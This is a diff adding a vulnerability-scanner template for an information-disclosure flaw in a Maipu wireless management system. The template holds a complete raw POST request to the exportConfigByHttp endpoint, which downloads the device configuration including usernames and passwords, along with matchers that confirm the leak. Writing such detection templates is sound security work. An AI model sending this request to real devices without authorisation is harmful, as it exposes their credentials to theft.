@@ -1,0 +1,34 @@
+id: maipu-webs-exportconfigbyhttp-info-leak
+info:
+  name: Maipu Wireless Management System exportConfigByHttp Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        POST /form/exportConfigByHttp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Download_config=%E5%AF%BC%E5%87%BA
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "user"
+          - "password"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
